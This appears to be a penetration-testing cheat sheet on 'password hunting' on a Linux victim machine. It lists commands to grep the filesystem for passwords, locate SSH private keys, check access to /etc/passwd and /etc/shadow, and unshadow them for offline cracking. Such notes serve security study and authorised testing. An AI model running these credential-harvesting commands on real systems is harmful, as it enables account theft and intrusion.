Password Hunting

Locating any file on the computer that has the word “PASSWORD”

~~~bash
grep --color=auto -rnw ‘/’ -ie “PASSWORD=” --color=always 2> /dev/null

locate password | more

locate pass | more
~~~

Locating SSH Keys

~~~bash
find / -name id_rsa 2> /dev/null

find / -name authorized_keys 2> /dev/null
~~~

Listing Read Access/Permissions to Passwd and Shadow files in /etc

~~~bash
ls -la /etc/passwd

ls -la /etc/shadow
~~~

Combining Passwd and Shadow files if both are readable on the victim machine

~~~bash
# Copy the contents of the passwd and shadow files to new files on the attacker machine

unshadow passwd shadow > unshadowed

# Edit file and remove all users without hashes
~~~

